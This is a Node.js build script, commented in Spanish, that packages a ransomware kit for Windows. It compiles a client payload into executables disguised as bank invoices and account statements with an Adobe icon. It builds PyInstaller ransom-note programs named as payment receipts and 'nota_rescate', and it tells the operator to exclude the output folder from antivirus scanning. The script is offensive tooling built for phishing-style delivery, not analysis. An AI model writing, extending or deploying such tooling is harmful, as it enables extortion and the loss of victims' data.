const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const distDir = path.join(__dirname, 'dist');

// Ensure dist directory exists
if (!fs.existsSync(distDir)) {
    fs.mkdirSync(distDir, { recursive: true });
}

// Function to try to delete a file safely
function tryDelete(filename) {
    const filePath = path.join(distDir, filename);
    if (!fs.existsSync(filePath)) return true;
    try {
        fs.unlinkSync(filePath);
        return true;
    } catch (e) {
        return false;
    }
}

// Function to attempt build
function runBuild(filename) {
    console.log(`\n🔄 Intentando compilar a dist/${filename}...`);

    // 1. Clean up potential previous file
    if (!tryDelete(filename)) {
        console.log(`⚠️  No se pudo borrar ${filename} (Bloqueado/En uso). Saltando...`);
        return false;
    }

    // 2. Run pkg (Client)
    try {
        console.log(`   [NODE] Compilando Cliente...`);
        execSync(`pkg cliente.js --targets node18-win-x64 --output dist/${filename}`, { stdio: 'inherit' });
    } catch (e) {
        console.log(`   [NODE] Fallo la compilacion del cliente. Bloqueado?`);
        return false;
    }

    // 3. Run PyInstaller (Ransom Notes - TWO VERSIONS)
    const iconRef = 'adobe_icon.ico';
    const iconAbsPath = path.resolve(__dirname, iconRef);
    const iconArg = fs.existsSync(iconRef) ? `--icon="${iconAbsPath}"` : '';

    // === NOTA 1: VERSION PYQT6 (Windows 10/11) ===
    const noteWin10 = 'Comprobante_Pago_2026';  // Para Win10/11
    if (fs.existsSync('interfazdeaviso.py')) {
        try {
            console.log(`   [PYTHON] Compilando Nota PyQt6 (${noteWin10}.exe) para Windows 10/11...`);
            execSync(`python -m PyInstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteWin10}" interfazdeaviso.py`, { stdio: 'inherit' });
            console.log(`   [PYTHON] Nota Win10/11 compilada con exito.`);
        } catch (e) {
            try {
                execSync(`pyinstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteWin10}" interfazdeaviso.py`, { stdio: 'inherit' });
                console.log(`   [PYTHON] Nota Win10/11 compilada con exito.`);
            } catch (err) {
                console.log(`   [PYTHON] Advertencia: No se pudo compilar nota PyQt6.`);
            }
        }

        // === NOTA ADICIONAL: nota_rescate.exe (nombre simple) ===
        try {
            console.log(`   [PYTHON] Compilando nota_rescate.exe...`);
            execSync(`python -m PyInstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work_nota --specpath build/py_spec_nota --name "nota_rescate" interfazdeaviso.py`, { stdio: 'inherit' });
            console.log(`   [PYTHON] nota_rescate.exe compilada con exito.`);
        } catch (e) {
            console.log(`   [PYTHON] Advertencia: No se pudo compilar nota_rescate.exe`);
        }
    }

    // === NOTA 2: VERSION TKINTER (Windows 7/8/8.1) ===
    const noteWin7 = 'Comprobante_Pago_2026_Legacy';  // Para Win7/8
    if (fs.existsSync('interfazdeaviso_tk.py')) {
        try {
            console.log(`   [PYTHON] Compilando Nota Tkinter (${noteWin7}.exe) para Windows 7/8...`);
            execSync(`python -m PyInstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work_tk --specpath build/py_spec_tk --name "${noteWin7}" interfazdeaviso_tk.py`, { stdio: 'inherit' });
            console.log(`   [PYTHON] Nota Win7/8 compilada con exito.`);
        } catch (e) {
            try {
                execSync(`pyinstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work_tk --specpath build/py_spec_tk --name "${noteWin7}" interfazdeaviso_tk.py`, { stdio: 'inherit' });
                console.log(`   [PYTHON] Nota Win7/8 compilada con exito.`);
            } catch (err) {
                console.log(`   [PYTHON] Advertencia: No se pudo compilar nota Tkinter.`);
            }
        }
    }

    // Copiar recursos adicionales a dist/
    const recursos = ['escudo.png'];
    for (const recurso of recursos) {
        if (fs.existsSync(recurso)) {
            try {
                fs.copyFileSync(recurso, path.join(distDir, recurso));
                console.log(`   [RECURSO] ${recurso} copiado a dist/`);
            } catch (e) {
                // Ignorar errores de copia
            }
        }
    }

    console.log(`\n EXCELENTE! Artefactos generados en dist/`);
    return true;
}

// Main logic
console.log(' Iniciando proceso de construccion inteligente...');

// Kill any stuck instances first
try {
    execSync('taskkill /F /IM cliente.exe', { stdio: 'ignore' });
} catch (e) { }

// List of preferred names to try in order (bank invoice style 2026)
const candidates = ['Factura_Electronica_Enero2026.exe', 'Estado_Cuenta_2026.exe', 'Comprobante_Bancario_2026.exe'];
let built = false;

// Try candidates
for (const name of candidates) {
    if (runBuild(name)) {
        built = true;
        break;
    }
}

// Fallback to timestamp if all else fails
if (!built) {
    const timestampName = `cliente_${Date.now()}.exe`;
    console.log(`\n⚠️  Nombres estandar bloqueados. Probando nombre unico: ${timestampName}`);
    if (runBuild(timestampName)) {
        built = true;
    }
}

if (!built) {
    console.error('\n💥 Todas las intentos de compilacion fallaron.');
    console.error('💡 SUGERENCIA: Agrega la carpeta "dist" a las exclusiones de tu Antivirus.');
    process.exit(1);
}
